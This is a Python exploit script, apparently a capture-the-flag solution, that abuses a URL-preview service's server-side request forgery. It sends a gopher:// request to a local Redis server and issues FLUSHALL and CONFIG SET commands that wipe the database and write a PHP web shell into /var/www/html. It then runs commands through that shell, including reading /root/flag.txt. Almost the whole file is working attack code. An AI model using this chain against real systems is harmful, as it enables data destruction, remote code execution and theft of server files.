import urllib.request
import urllib.parse
import re

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch(target_url, timeout=10):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    try:
        res = urllib.request.urlopen(req, timeout=timeout)
        html = res.read().decode()
        m = re.search(r'class="preview-content">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'PREVIEW: ' + m.group(1).strip()[:2000]
        m = re.search(r'class="error-msg">(.*?)</div>', html, re.DOTALL)
        if m:
            return 'ERROR: ' + m.group(1).strip()
        return 'OTHER: len=' + str(len(html))
    except Exception as e:
        return f'EXCEPTION: {e}'

# Build Redis commands to write a webshell
# Using inline Redis commands separated by \r\n
redis_cmds = "\r\n".join([
    "FLUSHALL",
    "CONFIG SET dir /var/www/html/",
    "CONFIG SET dbfilename shell.php",
    'SET webshell "\\n\\n<?php system($_GET[c]); ?>\\n\\n"',
    "SAVE",
    "QUIT",
    ""
])

# URL-encode the redis commands for gopher (after the _ type selector)
encoded_cmds = urllib.parse.quote(redis_cmds)
gopher_url = f"gopher://127.0.0.1:6379/_{encoded_cmds}"

print("=== Sending Redis webshell via gopher ===")
print(f"Gopher URL length: {len(gopher_url)}")
result = fetch(gopher_url, timeout=10)
print(result)
print()

# Now try to access the webshell
print("=== Testing webshell ===")
result = fetch("http://127.0.0.1/shell.php?c=id", timeout=10)
print(result)
print()

# If that didn't work, try reading flag directly
result = fetch("http://127.0.0.1/shell.php?c=cat+/root/flag.txt", timeout=10)
print(result)
